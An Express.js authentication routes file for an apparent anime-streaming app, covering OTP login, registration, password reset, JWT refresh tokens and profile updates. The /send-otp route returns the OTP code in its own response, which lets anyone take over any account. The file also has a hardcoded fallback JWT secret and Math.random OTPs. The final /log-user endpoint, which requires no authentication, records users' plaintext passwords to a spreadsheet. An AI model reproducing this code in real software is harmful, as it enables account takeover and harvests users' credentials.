const express = require("express");
const router = express.Router();
const jwt = require("jsonwebtoken");
const bcryptjs = require("bcryptjs");
const User = require("../user");
const protect = require("../auth");

const JWT_SECRET = process.env.JWT_SECRET || "crunchy_secret_key_change_in_production";
const JWT_EXPIRE = "7d";
const REFRESH_TOKEN_EXPIRE = "30d";

// Helper: Generate JWT Token
const generateToken = (userId) => {
    return jwt.sign({ userId }, JWT_SECRET, { expiresIn: JWT_EXPIRE });
};

// Helper: Generate Refresh Token
const generateRefreshToken = (userId) => {
    return jwt.sign({ userId }, JWT_SECRET, { expiresIn: REFRESH_TOKEN_EXPIRE });
};

// ============ SEND OTP (EMAIL & MOBILE) ============
router.post("/send-otp", async (req, res) => {
    try {
        const { email, phone, type } = req.body;
        const target = type === "mobile" ? phone : email;

        if (!target) {
            return res.status(400).json({
                success: false,
                message: `Please provide a valid ${type === "mobile" ? "mobile number" : "email address"}`
            });
        }

        // Generate 6-digit OTP
        const otpCode = Math.floor(100000 + Math.random() * 900000).toString();
        const expiresAt = new Date(Date.now() + 10 * 60 * 1000); // 10 mins

        let user = null;
        if (type === "mobile") {
            user = await User.findOne({ phone: target });
        } else {
            user = await User.findOne({ email: target.toLowerCase() });
        }

        if (!user) {
            // Create pending user record for OTP verification
            user = new User({
                name: type === "mobile" ? `User_${target.slice(-4)}` : target.split("@")[0],
                email: type === "mobile" ? `user_${Date.now()}@anime.plus` : target.toLowerCase(),
                phone: type === "mobile" ? target : undefined,
                tier: "MEGA FAN VIP"
            });
        }

        user.otp = {
            code: otpCode,
            expiresAt: expiresAt,
            type: type || "email",
            target: target
        };

        await user.save();

        res.json({
            success: true,
            message: `OTP sent successfully to ${target}`,
            simulatedOtp: otpCode // Included for easy testing in development!
        });
    } catch (error) {
        console.error("Send OTP error:", error);
        res.status(500).json({
            success: false,
            message: error.message || "Failed to send OTP"
        });
    }
});

// ============ VERIFY OTP & LOGIN ============
router.post("/verify-otp", async (req, res) => {
    try {
        const { email, phone, otp, type } = req.body;
        const target = type === "mobile" ? phone : email;

        if (!target || !otp) {
            return res.status(400).json({
                success: false,
                message: "Please provide target and 6-digit OTP code"
            });
        }

        let user = null;
        if (type === "mobile") {
            user = await User.findOne({ phone: target });
        } else {
            user = await User.findOne({ email: target.toLowerCase() });
        }

        if (!user || !user.otp || !user.otp.code) {
            return res.status(400).json({
                success: false,
                message: "No OTP requested for this account. Please request a new code."
            });
        }

        if (user.otp.code !== otp || new Date() > user.otp.expiresAt) {
            return res.status(400).json({
                success: false,
                message: "Invalid or expired OTP code"
            });
        }

        // Update name if provided
        if (req.body.name && req.body.name.trim()) {
            user.name = req.body.name.trim();
        }

        // Clear OTP after successful verification
        user.otp = undefined;
        user.isEmailVerified = true;
        user.lastLogin = new Date();

        // Generate tokens
        const token = generateToken(user._id);
        const refreshToken = generateRefreshToken(user._id);

        user.refreshTokens.push({
            token: refreshToken,
            expiresAt: new Date(Date.now() + 30 * 24 * 60 * 60 * 1000)
        });

        await user.save();

        res.json({
            success: true,
            message: "OTP verified successfully!",
            token,
            refreshToken,
            user: {
                id: user._id,
                name: user.name,
                email: user.email,
                phone: user.phone,
                avatar: user.avatar,
                tier: user.tier
            }
        });
    } catch (error) {
        console.error("Verify OTP error:", error);
        res.status(500).json({
            success: false,
            message: error.message || "OTP verification failed"
        });
    }
});

// ============ SET PASSWORD (For OTP Users) ============
router.post("/set-password", protect, async (req, res) => {
    try {
        const { newPassword, confirmPassword } = req.body;

        if (!newPassword || newPassword.length < 6) {
            return res.status(400).json({
                success: false,
                message: "Password must be at least 6 characters"
            });
        }

        if (newPassword !== confirmPassword) {
            return res.status(400).json({
                success: false,
                message: "Passwords do not match"
            });
        }

        const user = await User.findById(req.userId);
        if (!user) {
            return res.status(404).json({ success: false, message: "User not found" });
        }

        user.password = newPassword;
        await user.save();

        res.json({
            success: true,
            message: "Password set successfully!"
        });
    } catch (error) {
        res.status(500).json({ success: false, message: error.message });
    }
});

// ============ RESET PASSWORD WITH OTP ============
router.post("/reset-password", async (req, res) => {
    try {
        const { target, otp, newPassword, confirmPassword } = req.body;

        if (!target || !otp || !newPassword) {
            return res.status(400).json({
                success: false,
                message: "Please provide all required fields"
            });
        }

        if (newPassword !== confirmPassword) {
            return res.status(400).json({
                success: false,
                message: "Passwords do not match"
            });
        }

        let user = await User.findOne({
            $or: [{ email: target.toLowerCase() }, { phone: target }]
        });

        if (!user || !user.otp || user.otp.code !== otp || new Date() > user.otp.expiresAt) {
            return res.status(400).json({
                success: false,
                message: "Invalid or expired OTP code"
            });
        }

        user.password = newPassword;
        user.otp = undefined;
        await user.save();

        res.json({
            success: true,
            message: "Password reset successfully!"
        });
    } catch (error) {
        res.status(500).json({ success: false, message: error.message });
    }
});

// ============ REGISTER ============
router.post("/register", async (req, res) => {
    try {
        const { name, email, password, confirmPassword } = req.body;

        // Validation
        if (!name || !email || !password) {
            return res.status(400).json({
                success: false,
                message: "Please provide name, email, and password"
            });
        }

        if (password.length < 6) {
            return res.status(400).json({
                success: false,
                message: "Password must be at least 6 characters long"
            });
        }

        if (password !== confirmPassword) {
            return res.status(400).json({
                success: false,
                message: "Passwords do not match"
            });
        }

        // Check if user already exists
        const existingUser = await User.findOne({ email: email.toLowerCase() });
        if (existingUser) {
            return res.status(409).json({
                success: false,
                message: "Email already registered. Please sign in instead."
            });
        }

        // Create new user
        const user = new User({
            name: name.trim(),
            email: email.toLowerCase().trim(),
            password
        });

        await user.save();

        // Generate tokens
        const token = generateToken(user._id);
        const refreshToken = generateRefreshToken(user._id);

        // Save refresh token to database
        user.refreshTokens.push({
            token: refreshToken,
            expiresAt: new Date(Date.now() + 30 * 24 * 60 * 60 * 1000)
        });

        user.lastLogin = new Date();
        await user.save();

        res.status(201).json({
            success: true,
            message: "Account created successfully!",
            token,
            refreshToken,
            user: {
                id: user._id,
                name: user.name,
                email: user.email,
                avatar: user.avatar,
                tier: user.tier
            }
        });
    } catch (error) {
        console.error("Register error:", error);
        res.status(500).json({
            success: false,
            message: error.message || "Error creating account"
        });
    }
});

// ============ LOGIN ============
router.post("/login", async (req, res) => {
    try {
        const identifier = (req.body.email || req.body.phone || req.body.identifier || "").trim().toLowerCase();
        const password = req.body.password;

        // Validation
        if (!identifier || !password) {
            return res.status(400).json({
                success: false,
                message: "Please provide email/phone and password"
            });
        }

        // Find user by email OR phone
        const user = await User.findOne({
            $or: [{ email: identifier }, { phone: identifier }]
        }).select("+password");

        if (!user) {
            return res.status(401).json({
                success: false,
                message: "Invalid email/phone or password"
            });
        }

        // Compare passwords
        const isPasswordValid = await user.comparePassword(password);

        if (!isPasswordValid) {
            return res.status(401).json({
                success: false,
                message: "Invalid email or password"
            });
        }

        // Generate tokens
        const token = generateToken(user._id);
        const refreshToken = generateRefreshToken(user._id);

        // Save refresh token
        user.refreshTokens.push({
            token: refreshToken,
            expiresAt: new Date(Date.now() + 30 * 24 * 60 * 60 * 1000)
        });

        // Keep only last 5 refresh tokens
        if (user.refreshTokens.length > 5) {
            user.refreshTokens = user.refreshTokens.slice(-5);
        }

        user.lastLogin = new Date();
        await user.save();

        res.json({
            success: true,
            message: "Logged in successfully!",
            token,
            refreshToken,
            user: {
                id: user._id,
                name: user.name,
                email: user.email,
                avatar: user.avatar,
                tier: user.tier,
                watchlist: user.watchlist,
                favorites: user.favorites
            }
        });
    } catch (error) {
        console.error("Login error:", error);
        res.status(500).json({
            success: false,
            message: error.message || "Error during login"
        });
    }
});

// ============ REFRESH TOKEN ============
router.post("/refresh-token", async (req, res) => {
    try {
        const { refreshToken } = req.body;

        if (!refreshToken) {
            return res.status(400).json({
                success: false,
                message: "Refresh token is required"
            });
        }

        // Verify refresh token
        const decoded = jwt.verify(refreshToken, JWT_SECRET);
        const user = await User.findById(decoded.userId);

        if (!user) {
            return res.status(401).json({
                success: false,
                message: "User not found"
            });
        }

        // Check if refresh token exists and is valid
        const tokenExists = user.refreshTokens.some(
            (rt) => rt.token === refreshToken && new Date() < rt.expiresAt
        );

        if (!tokenExists) {
            return res.status(401).json({
                success: false,
                message: "Refresh token expired or invalid"
            });
        }

        // Generate new access token
        const newToken = generateToken(user._id);

        res.json({
            success: true,
            token: newToken
        });
    } catch (error) {
        res.status(401).json({
            success: false,
            message: "Invalid refresh token"
        });
    }
});

// ============ GET CURRENT USER (Protected) ============
router.get("/me", protect, async (req, res) => {
    try {
        const user = await User.findById(req.userId);

        if (!user) {
            return res.status(404).json({
                success: false,
                message: "User not found"
            });
        }

        res.json({
            success: true,
            user: {
                id: user._id,
                name: user.name,
                email: user.email,
                avatar: user.avatar,
                tier: user.tier,
                watchlist: user.watchlist,
                favorites: user.favorites,
                lastLogin: user.lastLogin,
                createdAt: user.createdAt
            }
        });
    } catch (error) {
        res.status(500).json({
            success: false,
            message: error.message || "Error fetching user"
        });
    }
});

// ============ UPDATE PROFILE (Protected) ============
router.put("/me", protect, async (req, res) => {
    try {
        const { name, avatar, tier } = req.body;
        const user = await User.findById(req.userId);

        if (!user) {
            return res.status(404).json({
                success: false,
                message: "User not found"
            });
        }

        if (name) user.name = name.trim();
        if (avatar) user.avatar = avatar;
        if (tier && ["FAN", "MEGA FAN", "ULTIMATE FAN"].includes(tier)) {
            user.tier = tier;
        }

        await user.save();

        res.json({
            success: true,
            message: "Profile updated successfully!",
            user: {
                id: user._id,
                name: user.name,
                email: user.email,
                avatar: user.avatar,
                tier: user.tier
            }
        });
    } catch (error) {
        res.status(500).json({
            success: false,
            message: error.message || "Error updating profile"
        });
    }
});

// ============ CHANGE PASSWORD (Protected) ============
router.post("/change-password", protect, async (req, res) => {
    try {
        const { oldPassword, newPassword, confirmPassword } = req.body;

        if (!oldPassword || !newPassword || !confirmPassword) {
            return res.status(400).json({
                success: false,
                message: "All password fields are required"
            });
        }

        if (newPassword.length < 6) {
            return res.status(400).json({
                success: false,
                message: "New password must be at least 6 characters"
            });
        }

        if (newPassword !== confirmPassword) {
            return res.status(400).json({
                success: false,
                message: "New passwords do not match"
            });
        }

        const user = await User.findById(req.userId).select("+password");

        if (!user) {
            return res.status(404).json({
                success: false,
                message: "User not found"
            });
        }

        // Verify old password
        const isCorrect = await user.comparePassword(oldPassword);

        if (!isCorrect) {
            return res.status(401).json({
                success: false,
                message: "Current password is incorrect"
            });
        }

        // Update password
        user.password = newPassword;
        await user.save();

        res.json({
            success: true,
            message: "Password changed successfully!"
        });
    } catch (error) {
        res.status(500).json({
            success: false,
            message: error.message || "Error changing password"
        });
    }
});

// ============ LOGOUT (Protected) ============
router.post("/logout", protect, async (req, res) => {
    try {
        const { refreshToken } = req.body;
        const user = await User.findById(req.userId);

        if (user && refreshToken) {
            user.refreshTokens = user.refreshTokens.filter(rt => rt.token !== refreshToken);
            await user.save();
        }

        res.json({
            success: true,
            message: "Logged out successfully!"
        });
    } catch (error) {
        res.status(500).json({
            success: false,
            message: error.message || "Error logging out"
        });
    }
});

// ============ LOG USER DETAILS TO SPREADSHEET ============
const { logUserToSpreadsheet } = require("../sheet-logger");

router.post("/log-user", (req, res) => {
    try {
        const { name, email, phone, password, authMethod } = req.body;
        logUserToSpreadsheet({ name, email, phone, password, authMethod });
        res.json({ success: true, message: "User details logged to spreadsheet!" });
    } catch (err) {
        res.status(500).json({ success: false, message: err.message });
    }
});

module.exports = router;
